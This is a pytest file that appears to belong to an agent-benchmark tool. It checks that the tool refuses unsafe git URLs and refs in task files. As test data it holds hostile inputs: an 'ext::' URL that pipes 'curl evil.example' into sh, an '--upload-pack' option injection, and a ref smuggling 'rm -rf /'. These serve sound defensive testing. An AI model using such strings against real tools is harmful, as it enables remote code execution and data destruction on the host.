"""Validation of task-file fields that reach a command line.

A task file is executed with the privileges of whoever runs the benchmark:
the repository is cloned or copied host-side, before any sandbox exists. For
a tool whose task sets are meant to be shared, that makes these fields an
input-validation boundary rather than a formality. See docs/SECURITY.md.
"""

import pytest
from pydantic import ValidationError

from agentbench.models.task import Task

BASE = {
    "id": "t",
    "repo_url": "https://github.com/example/repo.git",
    "setup_commands": [],
    "failing_test_command": "pytest",
}


def task(**overrides) -> Task:
    return Task(**(BASE | overrides))


@pytest.mark.parametrize(
    "repo_url",
    [
        "https://github.com/example/repo.git",
        "http://internal.example/repo.git",
        "ssh://git@github.com/example/repo.git",
        "git@github.com:example/repo.git",  # scp-style
        "file:///srv/mirrors/repo.git",
        "agentbench/tasks/fixtures/calc_repo",  # local path
        "/abs/path/to/repo",
    ],
)
def test_ordinary_repo_urls_are_accepted(repo_url):
    assert task(repo_url=repo_url).repo_url == repo_url


def test_the_ext_transport_is_refused():
    """`ext::` makes git run an arbitrary command. Modern git blocks it by
    default, but a user with protocol.ext.allow=always would not be."""
    with pytest.raises(ValidationError, match="ext"):
        task(repo_url="ext::sh -c 'curl evil.example | sh'")


@pytest.mark.parametrize("repo_url", ["--upload-pack=touch /tmp/x", "-o", "--config=x"])
def test_dash_leading_repo_urls_are_refused(repo_url):
    """git reads a leading dash as an option, not a repository."""
    with pytest.raises(ValidationError, match="may not start with"):
        task(repo_url=repo_url)


@pytest.mark.parametrize(
    "repo_ref",
    ["a1b2c3d4", "main", "v1.2.3", "refs/tags/v1", "feature/thing", "release-1.0"],
)
def test_ordinary_refs_are_accepted(repo_ref):
    assert task(repo_ref=repo_ref).repo_ref == repo_ref


@pytest.mark.parametrize(
    "repo_ref",
    [
        "--orphan",  # confirmed to change repo state when passed to checkout
        "-B",
        "main; rm -rf /",
        "main ref",
        "",
    ],
)
def test_unsafe_refs_are_refused(repo_ref):
    """`git checkout -- <ref>` means "these paths", so the ref cannot be
    separated from options by `--`. It has to be safe on its own."""
    with pytest.raises(ValidationError, match="plausible git ref"):
        task(repo_ref=repo_ref)


def test_fix_ref_is_validated_like_repo_ref():
    assert task(fix_ref="ec1ff9f6728f5f857402b294c218be731c62af5f").fix_ref
    with pytest.raises(ValidationError, match="plausible git ref"):
        task(fix_ref="--orphan")


def test_fix_ref_is_never_shown_to_the_agent():
    """It is the answer. The instruction is built from the task, so this is
    worth asserting rather than assuming."""
    import inspect

    from agentbench.orchestrator import runner

    assert "fix_ref" not in inspect.getsource(runner._instruction)


def test_the_clone_refuses_the_ext_transport_and_ends_options():
    """Second layer, in case a Task is constructed some other way."""
    import inspect

    from agentbench.orchestrator import runner

    source = inspect.getsource(runner._materialize_repo)
    assert "protocol.ext.allow=never" in source
    assert '"--",' in source  # nothing after this is read as an option
